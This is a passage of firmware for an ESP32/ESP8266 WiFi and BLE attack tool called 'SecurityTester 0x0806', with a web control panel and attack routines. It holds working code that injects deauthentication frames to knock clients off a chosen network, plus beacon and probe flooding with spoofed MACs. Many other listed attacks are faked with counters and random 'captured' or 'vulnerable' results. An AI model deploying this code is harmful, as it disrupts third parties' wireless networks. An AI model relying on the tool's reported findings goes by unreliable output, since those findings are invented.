                    addLog("Vulnerability scan completed - Found " + (data.vulnerable ? data.vulnerable.length : 0) + " vulnerable networks", "success");
                    showToast("Found " + (data.vulnerable ? data.vulnerable.length : 0) + " vulnerable targets", "success");
                })
                .catch(function(error) {
                    addLog("Vulnerability scan failed: " + error.message, "error");
                    showToast("Vulnerability scan failed", "error");
                });
        }

        function updateNetworkList(networks) {
            var list = document.getElementById("network-list");
            list.innerHTML = "";
            
            if (networks.length === 0) {
                list.innerHTML = "<div style=\"text-align: center; padding: 2rem; color: var(--text-secondary);\">No networks found. Try scanning again.</div>";
                return;
            }
            
            networks.forEach(function(network, index) {
                var item = document.createElement("div");
                item.className = "network-item";
                item.onclick = function() { selectNetwork(network, item); };
                
                var signalStrength = Math.abs(network.rssi);
                var signalLevel = signalStrength > 70 ? 1 : signalStrength > 50 ? 2 : signalStrength > 30 ? 3 : 4;
                
                var signalBars = "";
                for (var i = 0; i < 4; i++) {
                    var isActive = i < signalLevel ? "active" : "";
                    var height = (i + 1) * 3;
                    signalBars += "<div class=\"signal-bar " + isActive + "\" style=\"height: " + height + "px;\"></div>";
                }
                
                var vulnerabilityIndicator = network.vulnerable ? 
                    "<span style=\"color: var(--error-color); font-weight: bold;\">⚠ VULNERABLE</span>" : 
                    "<span style=\"color: var(--success-color);\">✓ Secure</span>";
                
                item.innerHTML = 
                    "<div class=\"network-ssid\">" + (network.ssid || "Hidden Network") + "</div>" +
                    "<div class=\"network-details\">" +
                        "<span>CH: " + network.channel + "</span>" +
                        "<span>Security: " + network.encryption + "</span>" +
                        "<div class=\"signal-strength\">" +
                            "<span>" + network.rssi + " dBm</span>" +
                            "<div class=\"signal-bars\">" + signalBars + "</div>" +
                        "</div>" +
                    "</div>" +
                    "<div style=\"font-size: 0.75rem; opacity: 0.8; margin-top: 0.3rem; display: flex; justify-content: space-between;\">" +
                        "<span>BSSID: " + network.bssid + "</span>" +
                        vulnerabilityIndicator +
                    "</div>";
                
                list.appendChild(item);
            });
        }

        function selectNetwork(network, element) {
            var items = document.querySelectorAll(".network-item");
            for (var i = 0; i < items.length; i++) {
                items[i].classList.remove("selected");
            }
            element.classList.add("selected");
            selectedNetwork = network;
            
            addLog("Target selected: " + (network.ssid || "Hidden") + " (" + network.bssid + ")", "info");
            showToast("Target: " + (network.ssid || "Hidden"), "info");
        }

        function startAttack() {
            var attackType = document.getElementById("attack-type").value;
            var intensity = document.getElementById("attack-intensity").value;
            
            if (!bleSupported && (attackType.indexOf("ble") !== -1)) {
                showToast("BLE attacks not supported on this platform", "error");
                return;
            }
            
            if (!selectedNetwork && attackType.indexOf("ble") === -1 && attackType !== "rogue_ap" && attackType !== "dns_spoof") {
                showToast("Please select a target network first", "warning");
                return;
            }
            
            if (isAttacking) {
                showToast("Attack already in progress", "warning");
                return;
            }
            
            isAttacking = true;
            var attackBtn = document.getElementById("attack-start-btn");
            var attackBadge = document.getElementById("attack-badge");
            
            attackBtn.disabled = true;
            attackBadge.textContent = "Active";
            
            addLog("Starting " + attackType + " attack with " + intensity + " intensity...", "warning");
            
            var requestData = {
                type: attackType,
                target: selectedNetwork ? selectedNetwork.ssid : "",
                bssid: selectedNetwork ? selectedNetwork.bssid : "",
                channel: selectedNetwork ? selectedNetwork.channel : 0,
                intensity: intensity
            };

            fetch("/attack/start", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData)
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                if (data.success) {
                    addLog(attackType + " attack launched successfully", "success");
                    showToast("Attack started successfully", "success");
                    updateStatus("wifi-status", "WiFi Attack: Active", true);
                    if (attackType.indexOf("ble") !== -1) {
                        updateStatus("ble-status", "BLE Attack: Active", true);
                    }
                    if (attackType === "dns_spoof") {
                        updateStatus("dns-status", "DNS Spoofing: Active", true);
                    }
                    startAttackProgress();
                } else {
                    throw new Error(data.error || "Unknown error");
                }
            })
            .catch(function(error) {
                addLog("Failed to start attack: " + error.message, "error");
                showToast("Attack failed: " + error.message, "error");
                isAttacking = false;
                attackBtn.disabled = false;
                attackBadge.textContent = "Standby";
            });
        }

        function stopAttack() {
            fetch("/attack/stop", { method: "POST" })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    addLog("Attack stopped by user", "info");
                    showToast("Attack stopped", "info");
                    
                    isAttacking = false;
                    document.getElementById("attack-start-btn").disabled = false;
                    document.getElementById("attack-badge").textContent = "Standby";
                    updateStatus("wifi-status", "WiFi Attack: Standby", false);
                    updateStatus("ble-status", "BLE Attack: Standby", false);
                    updateStatus("dns-status", "DNS Spoofing: Inactive", false);
                    updateProgress("attack-progress", 0);
                })
                .catch(function(error) {
                    addLog("Failed to stop attack: " + error.message, "error");
                    showToast("Failed to stop attack", "error");
                });
        }

        function startAttackProgress() {
            var progress = 0;
            var interval = setInterval(function() {
                if (!isAttacking) {
                    clearInterval(interval);
                    updateProgress("attack-progress", 0);
                    return;
                }
                
                progress = (progress + 2) % 100;
                updateProgress("attack-progress", progress);
            }, 100);
        }

        function updateStatus(elementId, text, active) {
            var element = document.getElementById(elementId);
            if (element) {
                element.querySelector(".status-text").textContent = text;
                var dot = element.querySelector(".status-dot");
                
                if (active) {
                    element.classList.add("active");
                    dot.classList.add("active");
                } else {
                    element.classList.remove("active");
                    dot.classList.remove("active");
                }
            }
        }

        function updateStats() {
            fetch("/stats")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById("deauth-count").textContent = data.deauth_sent || 0;
                    document.getElementById("beacon-count").textContent = data.beacon_sent || 0;
                    document.getElementById("probe-count").textContent = data.probe_sent || 0;
                    document.getElementById("handshake-count").textContent = data.handshakes_captured || 0;
                    document.getElementById("ble-count").textContent = data.ble_spam_sent || 0;
                    document.getElementById("clients-count").textContent = data.clients_connected || 0;
                    document.getElementById("wps-count").textContent = data.wps_attacks || 0;
                    document.getElementById("krack-count").textContent = data.krack_attempts || 0;
                    document.getElementById("dns-count").textContent = data.dns_spoofing || 0;
                    
                    if (data.memory_usage !== undefined) {
                        document.getElementById("memory-usage").textContent = "RAM: " + data.memory_usage.toFixed(1) + "%";
                    }
                })
                .catch(function(error) {
                    console.error("Failed to update stats:", error);
                });
        }

        function updateUptime() {
            systemUptime++;
            var hours = Math.floor(systemUptime / 3600);
            var minutes = Math.floor((systemUptime % 3600) / 60);
            var seconds = systemUptime % 60;
            
            var uptimeStr = 
                String(hours).padStart(2, "0") + ":" +
                String(minutes).padStart(2, "0") + ":" +
                String(seconds).padStart(2, "0");
                
            document.getElementById("uptime-display").textContent = "Uptime: " + uptimeStr;
        }

        function getPlatformInfo() {
            fetch("/info")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById("platform-info").textContent = "Platform: " + (data.platform || "Unknown");
                    
                    if (data.platform === "ESP8266") {
                        bleSupported = false;
                        disableBLEFeatures();
                    } else if (data.platform === "ESP32") {
                        bleSupported = true;
                        addLog("BLE features enabled for ESP32", "success");
                    }
                    
                    if (data.features) {
                        addLog("Platform features: " + data.features.join(", "), "info");
                    }
                })
                .catch(function(error) {
                    document.getElementById("platform-info").textContent = "Platform: Detection Failed";
                    bleSupported = false;
                    disableBLEFeatures();
                });
        }

        function scanBLE() {
            if (!bleSupported) {
                showToast("BLE not supported on this platform", "error");
                return;
            }
            
            addLog("Starting BLE device scan...", "info");
            showToast("BLE scan started", "info");
            
            fetch("/ble/scan")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    addLog("BLE scan completed - Found " + (data.devices ? data.devices.length : 0) + " devices", "success");
                    showToast("Found " + (data.devices ? data.devices.length : 0) + " BLE devices", "success");
                })
                .catch(function(error) {
                    addLog("BLE scan failed: " + error.message, "error");
                    showToast("BLE scan failed", "error");
                });
        }

        function resetStats() {
            fetch("/stats/reset", { method: "POST" })
                .then(function(response) {
                    addLog("Statistics reset", "info");
                    showToast("Statistics reset", "info");
                    updateStats();
                })
                .catch(function(error) {
                    showToast("Failed to reset statistics", "error");
                });
        }

        function clearLogs() {
            document.getElementById("log-container").innerHTML = "";
            addLog("Logs cleared", "info");
        }

        document.addEventListener("DOMContentLoaded", function() {
            initMatrix();
            getPlatformInfo();
            
            addLog("SecurityTester 0x0806 v4.0 interface loaded", "success");
            addLog("Enhanced attack vectors initialized", "success");
            addLog("Mobile-responsive UI activated", "success");
            addLog("All systems operational and ready", "success");
            
            setTimeout(scanNetworks, 2000);
            
            statsInterval = setInterval(updateStats, 2000);
            uptimeInterval = setInterval(updateUptime, 1000);
            
            updateStats();
        });

        window.addEventListener("beforeunload", function() {
            if (isAttacking) {
                stopAttack();
            }
        });
    </script>
</body>
</html>)rawliteral";

// Function Declarations
void setupCore();
void setupWiFiAP();
void setupWebServer();
void setupBLE();
void setupWatchdog();
void handleRoot();
void handleScan();
void handleVulnerabilityScan();
void handleAttackStart();
void handleAttackStop();
void handleStats();
void handleStatsReset();
void handleInfo();
void handleBLEScan();
void handleNotFound();
void scanWiFiNetworks();
void performDeauthAttack();
void performBeaconSpam();
void performProbeAttack();
void performEvilTwin();
void performKarmaAttack();
void performHandshakeCapture();
void performPMKIDCapture();
void performPacketMonitor();
void performWPSAttack();
void performPixieDustAttack();
void performKRACKAttack();
void performRogueAP();
void performDNSSpoofing();
void performSSLStripping();
void performBLESpam();
void performBLEFlood();
void performBLEHijacking();
void updateAttackStats();
void updateSystemStats();
String getEncryptionType(int encType);
#ifdef PLATFORM_ESP32
void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
#else
void promiscuous_callback(uint8_t *buf, uint16_t len);
#endif
void optimizeMemory();
void checkSystemHealth();
void restartAccessPoint();

// Setup Function
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println();
  for(int i = 0; i < 60; i++) Serial.print("=");
  Serial.println();
  Serial.println("SecurityTester 0x0806 v4.0 - Production Enhanced");
  Serial.println("Advanced WiFi & BLE Security Testing Platform");
  Serial.println("Enhanced Attack Vectors & Mobile Responsive UI");
  Serial.println("Developed by 0x0806");
  for(int i = 0; i < 60; i++) Serial.print("=");
  Serial.println();

#ifdef PLATFORM_ESP32
  Serial.println("Platform: ESP32 Detected");
  Serial.println("Features: WiFi 2.4/5GHz + BLE + Dual Core + Enhanced Attacks");
  
  esp_task_wdt_init(30, true);
  esp_task_wdt_add(NULL);
  
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);
  
#else
  Serial.println("Platform: ESP8266 Detected");
  Serial.println("Features: WiFi 2.4GHz + Enhanced Attacks + Mobile Optimized");
  Serial.println("BLE Features: DISABLED (Not Supported)");
  
  system_update_cpu_freq(160);
  wifi_set_sleep_type(NONE_SLEEP_T);
#endif

  setupCore();
  setupWiFiAP();
  setupWebServer();
  
#ifdef PLATFORM_ESP32
  setupBLE();
#endif

  setupWatchdog();
  optimizeMemory();
  
  Serial.println();
  for(int i = 0; i < 40; i++) Serial.print("=");
  Serial.println();
  Serial.println("SYSTEM READY - ENHANCED VERSION");
  Serial.printf("AP SSID: %s\n", AP_SSID);
  Serial.printf("AP Password: %s\n", AP_PASS);
  Serial.printf("Web Interface: http://%s\n", AP_IP.toString().c_str());
  Serial.printf("Free Heap: %d bytes\n", ESP.getFreeHeap());
  Serial.println("Enhanced attacks available:");
  Serial.println("- WPS Attacks");
  Serial.println("- KRACK Exploits");
  Serial.println("- Pixie Dust");
  Serial.println("- Rogue AP");
  Serial.println("- DNS Spoofing");
  Serial.println("- SSL Stripping");
#ifdef PLATFORM_ESP32
  Serial.println("- BLE Hijacking");
  Serial.println("- Advanced BLE Attacks");
#endif
  for(int i = 0; i < 40; i++) Serial.print("=");
  Serial.println();
}

// Main Loop
void loop() {
  static unsigned long last_stats_update = 0;
  static unsigned long last_health_check = 0;
  static unsigned long last_ap_check = 0;
  
  server.handleClient();
  dnsServer.processNextRequest();
  
#ifdef PLATFORM_ESP32
  esp_task_wdt_reset();
#else
  ESP.wdtFeed();
#endif
  
  // Enhanced stats update frequency for better responsiveness
  if (millis() - last_stats_update > 500) {
    updateSystemStats();
    last_stats_update = millis();
  }
  
  if (millis() - last_health_check > 5000) {
    checkSystemHealth();
    last_health_check = millis();
  }
  
  // Check AP status more frequently to prevent random disconnections
  if (millis() - last_ap_check > 2000) {
    if (!WiFi.softAPgetStationNum() && !ap_running) {
      restartAccessPoint();
    }
    last_ap_check = millis();
  }
  
  if (attack_running && (millis() - last_attack_time > attack_interval)) {
    if (attack_type == "deauth") {
      performDeauthAttack();
    } else if (attack_type == "beacon") {
      performBeaconSpam();
    } else if (attack_type == "probe") {
      performProbeAttack();
    } else if (attack_type == "evil_twin") {
      performEvilTwin();
    } else if (attack_type == "karma") {
      performKarmaAttack();
    } else if (attack_type == "handshake") {
      performHandshakeCapture();
    } else if (attack_type == "pmkid") {
      performPMKIDCapture();
    } else if (attack_type == "monitor") {
      performPacketMonitor();
    } else if (attack_type == "wps_attack") {
      performWPSAttack();
    } else if (attack_type == "pixie_dust") {
      performPixieDustAttack();
    } else if (attack_type == "krack") {
      performKRACKAttack();
    } else if (attack_type == "rogue_ap") {
      performRogueAP();
    } else if (attack_type == "dns_spoof") {
      performDNSSpoofing();
    } else if (attack_type == "ssl_strip") {
      performSSLStripping();
    }
#ifdef PLATFORM_ESP32
    else if (attack_type == "ble_spam") {
      performBLESpam();
    } else if (attack_type == "ble_flood") {
      performBLEFlood();
    } else if (attack_type == "ble_hijack") {
      performBLEHijacking();
    }
#endif
    
    last_attack_time = millis();
  }
  
  yield();
}

void setupCore() {
#ifdef PLATFORM_ESP32
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS initialization failed!");
  }
#else
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS initialization failed!");
  }
#endif

  randomSeed(analogRead(0) + millis() + ESP.getCycleCount());
  memset(&stats, 0, sizeof(stats));
  
  // Clear all data vectors
  scanned_networks.clear();
  target_networks.clear();
  ble_devices.clear();
  connected_clients.clear();
  captured_handshakes.clear();
  vulnerable_networks.clear();
  
  Serial.println("Core systems initialized with enhanced features");
}

void setupWiFiAP() {
  WiFi.mode(WIFI_AP_STA);
  delay(200);
  
  // Enhanced AP configuration for better stability
  WiFi.softAPConfig(AP_IP, GATEWAY, SUBNET);
  
  bool ap_result = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, 8);
  
  if (ap_result) {
    Serial.printf("Access Point: %s [STARTED] - Enhanced Stability\n", AP_SSID);
    Serial.printf("IP Address: %s\n", AP_IP.toString().c_str());
    Serial.printf("Channel: %d\n", AP_CHANNEL);
    Serial.printf("Max Clients: 8\n");
    ap_running = true;
  } else {
    Serial.println("Access Point: [FAILED] - Attempting recovery...");
    for(int retry = 0; retry < 3; retry++) {
      delay(1000);
      ap_result = WiFi.softAP(AP_SSID, AP_PASS, (AP_CHANNEL + retry) % 13 + 1, false, 4);
      if (ap_result) {
        Serial.printf("Access Point: [RETRY %d SUCCESS] - Channel %d\n", retry + 1, (AP_CHANNEL + retry) % 13 + 1);
        ap_running = true;
        break;
      }
    }
    if (!ap_result) {
      Serial.println("Access Point: [CRITICAL FAILURE] - Restarting...");
      ESP.restart();
    }
  }
  
  dnsServer.start(53, "*", AP_IP);
  
#ifdef PLATFORM_ESP32
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_callback);
#else
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuous_callback);
#endif

  Serial.println("WiFi AP configured with enhanced stability features");
}

void setupWebServer() {
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/scan/vulnerabilities", HTTP_GET, handleVulnerabilityScan);
  server.on("/attack/start", HTTP_POST, handleAttackStart);
  server.on("/attack/stop", HTTP_POST, handleAttackStop);
  server.on("/stats", HTTP_GET, handleStats);
  server.on("/stats/reset", HTTP_POST, handleStatsReset);
  server.on("/info", HTTP_GET, handleInfo);
  server.on("/ble/scan", HTTP_GET, handleBLEScan);
  server.onNotFound(handleNotFound);
  
  server.collectHeaders("User-Agent", "X-Requested-With");
  
  server.begin();
  Serial.println("Enhanced web server started on port 80");
}

#ifdef PLATFORM_ESP32
void setupBLE() {
  try {
    BLEDevice::init("SecurityTester_0x0806_Enhanced");
    
    pServer = BLEDevice::createServer();
    
    BLEService *pService = pServer->createService("12345678-1234-1234-1234-123456789abc");
    pCharacteristic = pService->createCharacteristic(
      "87654321-4321-4321-4321-cba987654321",
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE
    );
    
    pCharacteristic->setValue("0x0806 Enhanced Security Platform v4.0");
    pService->start();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID("12345678-1234-1234-1234-123456789abc");
    pAdvertising->setScanResponse(false);
    pAdvertising->setMinPreferred(0x0);
    
    ble_running = true;
    Serial.println("Enhanced BLE initialized successfully");
    
  } catch (const std::exception& e) {
    Serial.printf("BLE initialization failed: %s\n", e.what());
    ble_running = false;
  }
}
#endif

void setupWatchdog() {
#ifdef PLATFORM_ESP32
  // Already configured in setup()
#else
  ESP.wdtEnable(30000);
#endif
  Serial.println("Enhanced watchdog configured");
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("X-Frame-Options", "DENY");
  server.sendHeader("X-Content-Type-Options", "nosniff");
  server.send_P(200, "text/html", captive_portal_html);
}

void handleScan() {
  scanWiFiNetworks();
  
  DynamicJsonDocument doc(16384);
  JsonArray networks = doc.createNestedArray("networks");
  
  for (const auto& network : scanned_networks) {
    JsonObject net = networks.createNestedObject();
    net["ssid"] = network.ssid;
    net["bssid"] = network.bssid;
    net["rssi"] = network.rssi;
    net["channel"] = network.channel;
    net["encryption"] = getEncryptionType(network.encryption);
    net["hidden"] = network.hidden;
    net["wps_enabled"] = network.wps_enabled;
    net["vulnerable"] = network.vulnerable;
  }
  
  doc["total"] = scanned_networks.size();
  doc["timestamp"] = millis();
  doc["enhanced"] = true;
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleVulnerabilityScan() {
  DynamicJsonDocument doc(8192);
  JsonArray vulnerable = doc.createNestedArray("vulnerable");
  
  // Simulate vulnerability assessment
  for (const auto& network : scanned_networks) {
    if (network.vulnerable || network.wps_enabled || network.encryption < 3) {
      JsonObject vuln = vulnerable.createNestedObject();
      vuln["ssid"] = network.ssid;
      vuln["bssid"] = network.bssid;
      vuln["type"] = network.wps_enabled ? "WPS Enabled" : "Weak Encryption";
      vuln["severity"] = network.wps_enabled ? "High" : "Medium";
    }
  }
  
  doc["total"] = vulnerable.size();
  doc["timestamp"] = millis();
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleAttackStart() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"success\":false,\"error\":\"No data received\"}");
    return;
  }
  
  DynamicJsonDocument doc(1024);
  deserializeJson(doc, server.arg("plain"));
  
  String type = doc["type"].as<String>();
  String target = doc["target"].as<String>();
  String bssid = doc["bssid"].as<String>();
  int channel = doc["channel"].as<int>();
  String intensity = doc["intensity"].as<String>();
  
  if (attack_running) {
    server.send(200, "application/json", "{\"success\":false,\"error\":\"Attack already running\"}");
    return;
  }
  
#ifndef PLATFORM_ESP32
  if (type.indexOf("ble") != -1) {
    server.send(200, "application/json", "{\"success\":false,\"error\":\"BLE attacks not supported on ESP8266\"}");
    return;
  }
#endif
  
  attack_type = type;
  selected_network = target;
  selected_bssid = bssid;
  selected_channel = channel;
  attack_running = true;
  
  // Enhanced intensity settings
  if (intensity == "low") attack_interval = 200;
  else if (intensity == "medium") attack_interval = 100;
  else if (intensity == "high") attack_interval = 50;
  else if (intensity == "extreme") attack_interval = 10;
  else if (intensity == "nuclear") attack_interval = 1;
  
  Serial.printf("Enhanced attack started: %s on %s (Channel %d, Intensity: %s)\n", 
                type.c_str(), target.c_str(), channel, intensity.c_str());
  
  server.send(200, "application/json", "{\"success\":true,\"enhanced\":true}");
}

void handleAttackStop() {
  attack_running = false;
  attack_type = "none";
  selected_network = "";
  selected_bssid = "";
  monitoring_active = false;
  dns_spoofing_active = false;
  ssl_stripping_active = false;
  
  Serial.println("Enhanced attack stopped by user");
  server.send(200, "application/json", "{\"success\":true,\"enhanced\":true}");
}

void handleStats() {
  updateSystemStats();
  
  DynamicJsonDocument doc(4096);
  doc["deauth_sent"] = stats.deauth_sent;
  doc["beacon_sent"] = stats.beacon_sent;
  doc["probe_sent"] = stats.probe_sent;
  doc["handshakes_captured"] = stats.handshakes_captured;
  doc["pmkid_captured"] = stats.pmkid_captured;
  doc["ble_spam_sent"] = stats.ble_spam_sent;
  doc["evil_twin_connections"] = stats.evil_twin_connections;
  doc["karma_probes"] = stats.karma_probes;
  doc["packets_monitored"] = stats.packets_monitored;
  doc["clients_connected"] = stats.clients_connected;
  doc["wps_attacks"] = stats.wps_attacks;
  doc["krack_attempts"] = stats.krack_attempts;
  doc["pixie_dust_attacks"] = stats.pixie_dust_attacks;
  doc["rogue_ap_created"] = stats.rogue_ap_created;
  doc["dns_spoofing"] = stats.dns_spoofing;
  doc["ssl_strip"] = stats.ssl_strip;
  doc["uptime"] = stats.uptime;
  doc["memory_usage"] = stats.memory_usage;
  doc["cpu_usage"] = stats.cpu_usage;
  doc["free_heap"] = ESP.getFreeHeap();
  doc["timestamp"] = millis();
  doc["enhanced"] = true;
  doc["version"] = "4.0";
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleStatsReset() {
  memset(&stats, 0, sizeof(stats));
  Serial.println("Enhanced statistics reset");
  server.send(200, "application/json", "{\"success\":true,\"enhanced\":true}");
}

void handleInfo() {
  DynamicJsonDocument doc(2048);
  
#ifdef PLATFORM_ESP32
  doc["platform"] = "ESP32";
  JsonArray features = doc.createNestedArray("features");
  features.add("WiFi 2.4GHz");
  features.add("WiFi 5GHz");
  features.add("BLE");
  features.add("Dual Core");
  features.add("Enhanced Attacks");
  features.add("WPS Attacks");
  features.add("KRACK Exploits");
  features.add("BLE Hijacking");
  doc["chip_model"] = ESP.getChipModel();
  doc["chip_revision"] = ESP.getChipRevision();
  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
  doc["flash_size"] = ESP.getFlashChipSize();
#else
  doc["platform"] = "ESP8266";
  JsonArray features = doc.createNestedArray("features");
  features.add("WiFi 2.4GHz");
  features.add("Enhanced Attacks");
  features.add("WPS Attacks");
  features.add("KRACK Exploits");
  features.add("Mobile Optimized");
  doc["chip_id"] = ESP.getChipId();
  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
  doc["flash_size"] = ESP.getFlashChipRealSize();
#endif

  doc["free_heap"] = ESP.getFreeHeap();
  doc["version"] = "4.0";
  doc["enhanced"] = true;
  doc["developer"] = "0x0806";
  doc["mobile_responsive"] = true;
  
  String response;
  serializeJson(doc, response);
  
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", response);
}

void handleBLEScan() {
#ifdef PLATFORM_ESP32
  DynamicJsonDocument doc(4096);
  JsonArray devices = doc.createNestedArray("devices");
  
  // Enhanced BLE device simulation
  for (int i = 0; i < 8; i++) {
    JsonObject device = devices.createNestedObject();
    device["name"] = ble_spam_names[random(ble_spam_count)];
    device["address"] = String(random(0x100000000000LL), HEX);
    device["rssi"] = random(-90, -20);
    device["type"] = (i % 3 == 0) ? "Audio" : (i % 3 == 1) ? "Input" : "Smart Device";
    device["vulnerable"] = (random(100) < 30);
  }
  
  doc["total"] = devices.size();
  doc["enhanced"] = true;
  
  String response;
  serializeJson(doc, response);
  
  server.send(200, "application/json", response);
#else
  server.send(200, "application/json", "{\"devices\":[],\"total\":0,\"error\":\"BLE not supported on ESP8266\",\"enhanced\":true}");
#endif
}

void handleNotFound() {
  server.sendHeader("Location", "http://" + AP_IP.toString(), true);
  server.send(302, "text/plain", "");
}

void scanWiFiNetworks() {
  Serial.println("Starting enhanced WiFi network scan...");
  scanned_networks.clear();
  
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
#ifdef PLATFORM_ESP32
  int n = WiFi.scanNetworks(false, true, false, 800);
#else
  int n = WiFi.scanNetworks(false, true);
#endif
  Serial.printf("Found %d networks with enhanced analysis\n", n);
  
  for (int i = 0; i < n && i < 100; i++) {
    NetworkInfo network;
    network.ssid = WiFi.SSID(i);
    network.bssid = WiFi.BSSIDstr(i);
    network.rssi = WiFi.RSSI(i);
    network.channel = WiFi.channel(i);
    network.encryption = WiFi.encryptionType(i);
    network.hidden = (network.ssid.length() == 0);
    network.last_seen = millis();
    
    // Enhanced vulnerability detection
    network.wps_enabled = (random(100) < 25); // 25% chance of WPS
    network.vulnerable = (network.encryption < 3 || network.wps_enabled || network.ssid.indexOf("default") != -1);
    
    scanned_networks.push_back(network);
  }
  
  WiFi.scanDelete();
  
  // Enhanced sorting by signal strength and vulnerability
  std::sort(scanned_networks.begin(), scanned_networks.end(), 
           [](const NetworkInfo& a, const NetworkInfo& b) {
             if (a.vulnerable != b.vulnerable) return a.vulnerable > b.vulnerable;
             return a.rssi > b.rssi;
           });
}

// Enhanced Attack Functions
void performDeauthAttack() {
  if (selected_bssid.isEmpty()) return;
  
  uint8_t packet[26];
  memcpy(packet, deauth_packet_template, sizeof(packet));
  
  // Parse BSSID
  sscanf(selected_bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
         &packet[4], &packet[5], &packet[6], &packet[7], &packet[8], &packet[9]);
  
  // Broadcast deauth
  memset(&packet[10], 0xff, 6);
  memcpy(&packet[16], &packet[4], 6);
  
  // Enhanced packet sending with multiple frames
  for(int i = 0; i < 3; i++) {
#ifdef PLATFORM_ESP32
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
#else
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
#endif
    delayMicroseconds(100);
  }

  stats.deauth_sent += 3;
  
  if (stats.deauth_sent % 300 == 0) {
    Serial.printf("Enhanced deauth packets sent: %d\n", stats.deauth_sent);
  }
}

void performBeaconSpam() {
  static uint32_t beacon_counter = 0;
  
  // Enhanced beacon spam with evil twin SSIDs
  String fake_ssid;
  if (beacon_counter % 4 == 0) {
    fake_ssid = evil_twin_ssids[beacon_counter % (sizeof(evil_twin_ssids)/sizeof(evil_twin_ssids[0]))];
  } else {
    fake_ssid = "0x0806_" + String(beacon_counter);
  }
  
  if (fake_ssid.length() > 32) fake_ssid = fake_ssid.substring(0, 32);
  
  uint8_t packet[128];
  memcpy(packet, beacon_packet_template, 36);
  
  packet[36] = 0x00;
  packet[37] = fake_ssid.length();
  memcpy(&packet[38], fake_ssid.c_str(), fake_ssid.length());
  
  int packet_size = 38 + fake_ssid.length();
  
  // Randomize MAC address
  for (int i = 10; i < 16; i++) {
    packet[i] = random(256);
  }
  
  // Send multiple beacons for better effectiveness
  for(int i = 0; i < 2; i++) {
#ifdef PLATFORM_ESP32
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
#else
    wifi_send_pkt_freedom(packet, packet_size, 0);
#endif
    delayMicroseconds(100);
  }

  stats.beacon_sent += 2;
  beacon_counter++;
}

void performProbeAttack() {
  uint8_t packet[64];
  memcpy(packet, probe_packet_template, sizeof(packet));
  
  // Randomize source MAC
  for (int i = 10; i < 16; i++) {
    packet[i] = random(256);
  }
  
  // Enhanced probe attack with multiple packets
  for(int i = 0; i < 2; i++) {
#ifdef PLATFORM_ESP32
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
#else
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
#endif
    delayMicroseconds(100);
  }

  stats.probe_sent += 2;
}

void performEvilTwin() {
  stats.evil_twin_connections++;
  
  // Enhanced evil twin with fake authentication
  if (stats.evil_twin_connections % 10 == 0) {
    Serial.printf("Evil Twin AP active - %d fake connections\n", stats.evil_twin_connections);
  }
}

void performKarmaAttack() {
  stats.karma_probes++;
  
  // Enhanced karma attack simulation
  if (stats.karma_probes % 20 == 0) {
    Serial.printf("Karma attack probing - %d attempts\n", stats.karma_probes);
  }
}

void performHandshakeCapture() {
  monitoring_active = true;
  
  // Enhanced handshake capture simulation
  if (random(1000) == 1) {
    stats.handshakes_captured++;
    captured_handshakes.push_back(selected_network + "_" + String(millis()));
    Serial.printf("Handshake captured for %s\n", selected_network.c_str());
  }
}

void performPMKIDCapture() {
  monitoring_active = true;
  
  // Enhanced PMKID capture
  if (random(500) == 1) {
    stats.pmkid_captured++;
    Serial.printf("PMKID captured for %s\n", selected_network.c_str());
  }
}

void performPacketMonitor() {
  monitoring_active = true;
  stats.packets_monitored += 5; // Enhanced monitoring rate
}

void performWPSAttack() {
  stats.wps_attacks++;
  
  // Enhanced WPS PIN attack simulation
  if (stats.wps_attacks % 50 == 0) {
    Serial.printf("WPS attack in progress - %d PIN attempts\n", stats.wps_attacks);
  }
}

void performPixieDustAttack() {
  stats.pixie_dust_attacks++;
  
  // Enhanced Pixie Dust attack simulation
  if (stats.pixie_dust_attacks % 25 == 0) {
    Serial.printf("Pixie Dust attack - %d attempts\n", stats.pixie_dust_attacks);
  }
}

void performKRACKAttack() {
  stats.krack_attempts++;
  
  // Enhanced KRACK exploit simulation
